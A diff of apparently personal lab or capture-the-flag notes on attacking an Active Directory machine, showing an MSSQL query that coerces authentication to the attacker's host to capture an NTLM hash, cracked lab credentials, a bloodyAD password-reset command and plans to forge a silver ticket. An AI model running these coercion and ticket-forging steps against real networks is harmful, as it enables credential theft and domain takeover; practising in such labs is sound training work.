@@ -106,15 +106,34 @@ impacket-mssqlclient KLENDATHU.VL/zim:football22@10.13.38.36 -windows-auth
 ```
 
 
+## FORGING SILVER TICKET
+
 Steal NTLM HASH :: 
 
 ```
-SELECT * FROM sys.dm_os_file_exists('\\10.10.14.9\re\con');
+SELECT * FROM sys.dm_os_file_exists('\\10.10.14.17\re\con');
 
 We get hash on responder and cracking it ;
 
 RASCZAK :: starship99
 ```
+
+
+
+![](../../Pasted%20image%2020251108225239.png)
+
+
+
+![](../../Pasted%20image%2020251108225301.png)
+
+
+![](../../Pasted%20image%2020251108225333.png)
+
+
+Now in order to forge the silver ticket we need to know , nthash of service account , domain-sid / computer-sid ; and impacket-ticketer....
+
+
+
 
 
 ![](klendathu_2.png)
@@ -132,4 +151,4 @@ bloodyAD --host 10.13.38.35 -d klendathu.vl -u rasczak -p starship99 set passwor
 
 
 
-COERCING / NTLM RELAY [ATTACK](https://0xdeaddood.rocks/2023/02/28/relaying-everything-coercing-authentications-episode-1-mssql/) 
+
